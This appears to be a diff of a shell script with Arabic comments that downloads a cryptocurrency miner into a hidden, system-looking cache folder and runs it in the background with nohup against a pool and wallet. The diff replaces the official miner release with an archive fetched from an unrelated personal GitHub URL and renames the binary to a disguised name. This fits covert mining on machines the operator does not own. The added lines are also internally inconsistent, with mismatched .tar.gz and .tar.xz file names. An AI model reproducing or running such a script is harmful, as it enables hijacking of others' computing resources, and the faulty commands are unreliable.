@@ -11,14 +11,14 @@ WORKDIR="$HOME/.cache/.sysd"
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
 # تحميل SRBMiner-MULTI (Linux x64)
-wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-MULTI-2-4-7-Linux.tar.xz -O srb.tar.xz
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.xz
 
 # فك الضغط في المجلد المخفي
-tar -xf srb.tar.xz --strip=1
-rm srb.tar.xz
+tar -xvf scala.tar.gz --strip=1
+rm scala.tar.xz
 
 # تشغيل المعدّن في الخلفية بنواة واحدة
-nohup ./SRBMiner-MULTI \
+nohup ./scala \
    --algorithm ghostrider \
    --pool $POOL \
    --wallet $WALLET \
